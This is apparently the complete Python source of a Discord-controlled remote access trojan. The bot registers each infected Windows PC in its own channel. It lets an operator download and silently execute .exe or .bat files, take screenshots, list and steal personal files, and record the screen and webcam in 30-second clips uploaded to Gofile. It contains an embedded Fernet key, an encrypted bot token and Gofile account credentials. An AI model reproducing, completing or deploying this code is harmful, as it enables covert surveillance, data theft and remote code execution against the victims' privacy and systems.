import os
import discord
import subprocess
from discord.ext import commands
from PIL import ImageGrab
import io
import platform
from cryptography.fernet import Fernet
import requests
import cv2
import numpy as np
from datetime import datetime, timedelta
import asyncio
import pygetwindow as gw
import pyautogui
import time

# Decrypting the token
key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
cipher_suite = Fernet(key)

encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token

# Decrypt the token
TOKEN = cipher_suite.decrypt(encrypted_token).decode()

# Set up the bot
GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to download files to
DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"

# Ensure the download directory exists
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

# Gofile API endpoint and your credentials
GOFILE_API_URL = "https://upload.gofile.io/uploadfile"
GOFILE_ACCOUNT_TOKEN = "GpM5Bh6RYXbYcs2Uvwn4a7dIdCB20UM5"  # Your Gofile account token
GOFILE_ACCOUNT_ID = "de7d5f38-3ce6-4763-b07d-2f17bc86703f"  # Your Gofile account ID

# Helper function to create or get the user's channel
async def get_or_create_channel(ctx, user_name):
    guild = bot.get_guild(GUILD_ID)  # Use the specific guild by ID
    # Check if a channel with the name already exists
    channel = discord.utils.get(guild.text_channels, name=user_name.lower())
    if not channel:
        # If the channel doesn't exist, create it
        channel = await guild.create_text_channel(user_name)
    return channel

# Function to upload a file to Gofile and get the download link
def upload_to_gofile(file_path):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        headers = {
            'Authorization': f'Bearer {GOFILE_ACCOUNT_TOKEN}',
            'X-Request-Id': GOFILE_ACCOUNT_ID
        }
        response = requests.post(GOFILE_API_URL, files=files, headers=headers)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', {}).get('downloadPage', '')
        else:
            return None

# Custom converter for handling directory paths with spaces
class PathConverter(commands.Converter):
    async def convert(self, ctx, argument):
        return argument

# Command to handle file sending
@bot.command()
async def send(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        return

    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(DOWNLOAD_DIR, attachment.filename)

        # Download the file
        await attachment.save(file_path)

        # Now run the downloaded file silently (e.g., .exe, .bat)
        try:
            if file_path.endswith(".bat") or file_path.endswith(".exe"):
                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.green())
                await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.red())
                await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="Execution Failed", description=f"Failed to execute {attachment.filename}: {str(e)}", color=discord.Color.red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="No File Attached", description="No file attached. Please attach a file to send.", color=discord.Color.orange())
        await ctx.send(embed=embed)

# Command to take a screenshot
@bot.command()
async def screenshot(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        return

    # Take a screenshot using Pillow
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.blue())
    embed.set_image(url="attachment://screenshot.png")
    await ctx.send(embed=embed, file=discord.File(byte_io, 'screenshot.png'))

# Command to list specific directories and their contents
@bot.command()
async def filelist(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        return

    # Define the directories to list
    directories = ["Downloads", "Documents", "Videos", "Pictures"]

    # List all files and directories in the specified directories recursively
    file_list = []
    for dir_name in directories:
        dir_path = os.path.join(os.path.expanduser("~"), dir_name)
        if os.path.exists(dir_path):
            for root, dirs, files in os.walk(dir_path):
                for name in dirs:
                    file_list.append(os.path.join(root, name))
                for name in files:
                    file_list.append(os.path.join(root, name))

    # Split the file list into chunks of 3 embeds
    chunk_size = 3
    for i in range(0, len(file_list), chunk_size):
        chunk = file_list[i:i + chunk_size]
        file_list_str = "\n".join(chunk)
        embed = discord.Embed(title="File List", description=f"Files and directories in specified folders:\n{file_list_str}", color=discord.Color.blue())
        await ctx.send(embed=embed)

# Command to download a specific directory or file
@bot.command()
async def download(ctx, *, path: PathConverter):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        return

    # Prepend the current user's home directory if the path does not start with a drive letter
    if not os.path.isabs(path):
        path = os.path.join(os.path.expanduser("~"), path)

    # Check if the path exists
    if os.path.exists(path):
        if os.path.isdir(path):
            # List all files in the specified directory
            files = os.listdir(path)
            file_list = "\n".join([os.path.join(path, file) for file in files])
            embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.blue())
            await ctx.send(embed=embed)
        elif os.path.isfile(path):
            # Check if the file is larger than 5MB
            if os.path.getsize(path) > 5 * 1024 * 1024:
                # Upload the file to Gofile and get the download link
                download_link = upload_to_gofile(path)
                if download_link:
                    embed = discord.Embed(title="Large File Upload", description=f"File {path} is too large. Download it from here: {download_link}", color=discord.Color.blue())
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.red())
                    await ctx.send(embed=embed)
            else:
                # Send the file as an attachment
                await ctx.send(file=discord.File(path))
        else:
            embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.red())
        await ctx.send(embed=embed)

# Function to record screen using pyautogui and opencv for a given duration
async def record_screen(duration, file_path):
    # Get screen size
    screen_size = pyautogui.size()
    width, height = screen_size

    # Define the codec and create VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(file_path, fourcc, 20.0, (width, height))

    start_time = time.time()
    while time.time() - start_time < duration:
        # Capture the screen
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        # Write the frame into the file
        out.write(frame)

    # Release everything if job is finished
    out.release()
    cv2.destroyAllWindows()

# Function to record webcam using opencv for a given duration
def record_webcam(duration, output_path, camera_index=0):
    # Open the webcam
    cap = cv2.VideoCapture(camera_index)

    if not cap.isOpened():
        print("Error: Could not open webcam.")
        return

    # Define the codec and create VideoWriter object
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    frame_width = int(cap.get(3))
    frame_height = int(cap.get(4))
    out = cv2.VideoWriter(output_path, fourcc, 20.0, (frame_width, frame_height))

    start_time = time.time()
    while time.time() - start_time < duration:
        ret, frame = cap.read()
        if not ret:
            print("Failed to grab frame")
            break
        out.write(frame)

    # Release everything if job is finished
    cap.release()
    out.release()
    cv2.destroyAllWindows()

# Command to record system screen in intervals and upload to Gofile
@bot.command()
async def record(ctx, duration: int):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        return

    # Validate duration
    if duration <= 0:
        await ctx.send("Please provide a positive number of minutes to record.")
        return

    # Calculate total duration in seconds
    total_duration = duration * 60

    interval_duration = 30  # 30 seconds per interval
    start_time = datetime.now()

    while total_duration > 0:
        # Record the screen for the interval
        file_path = f'recorded_interval_{start_time.strftime("%Y%m%d_%H%M%S")}.avi'
        await record_screen(interval_duration, file_path)

        # Upload the video to Gofile in the background
        asyncio.create_task(upload_and_send_link(ctx, file_path))

        # Update the total duration
        total_duration -= interval_duration
        start_time = datetime.now()
        await asyncio.sleep(interval_duration)

# Command to record webcam in intervals and upload to Gofile
@bot.command()
async def webcam(ctx, duration: int, camera_index: int = 0):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        return

    # Validate duration
    if duration <= 0:
        await ctx.send("Please provide a positive number of minutes to record.")
        return

    # Calculate total duration in seconds
    total_duration = duration * 60

    interval_duration = 30  # 30 seconds per interval
    start_time = datetime.now()

    while total_duration > 0:
        # Record the webcam for the interval
        file_path = f'recorded_interval_{start_time.strftime("%Y%m%d_%H%M%S")}.avi'
        record_webcam(interval_duration, file_path, camera_index)

        # Upload the video to Gofile in the background
        asyncio.create_task(upload_and_send_link(ctx, file_path))

        # Update the total duration
        total_duration -= interval_duration
        start_time = datetime.now()
        await asyncio.sleep(interval_duration)

# Function to upload a file to Gofile and send the link to the channel
async def upload_and_send_link(ctx, file_path):
    gofile_link = upload_to_gofile(file_path)
    if gofile_link:
        await ctx.send(f'30-second interval recorded and uploaded to Gofile: {gofile_link}')
        # Delete the temporary file after uploading
        os.remove(file_path)

# Command to list all available commands
@bot.command()
async def cmds(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        return

    # List all commands
    command_list = "\n".join([f"!{cmd.name}" for cmd in bot.commands])
    embed = discord.Embed(title="Available Commands", description=f"Commands:\n{command_list}", color=discord.Color.blue())
    await ctx.send(embed=embed)

# On bot startup: Check and create the channel, ping @everyone in the corresponding channel
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Get the desktop name or username to create the channel
    desktop_name = platform.node()  # This is the name of the PC
    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found

    # Fetch the guild (server) by ID and the channel
    guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found!")
        return

    channel = await get_or_create_channel(guild, channel_name)

    global CHANNEL_ID
    CHANNEL_ID = channel.id

    # Send a "ping" message to indicate the bot is online
    await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
    embed = discord.Embed(title="Bot Online", description=f"The bot is now online and active on {desktop_name}.", color=discord.Color.green())
    await channel.send(embed=embed)

    print(f"Bot is online. Pinged channel: {channel.name}")

# Run the bot
def run_bot():
    print("Starting the bot...")
    bot.run(TOKEN)

if __name__ == "__main__":
    run_bot()
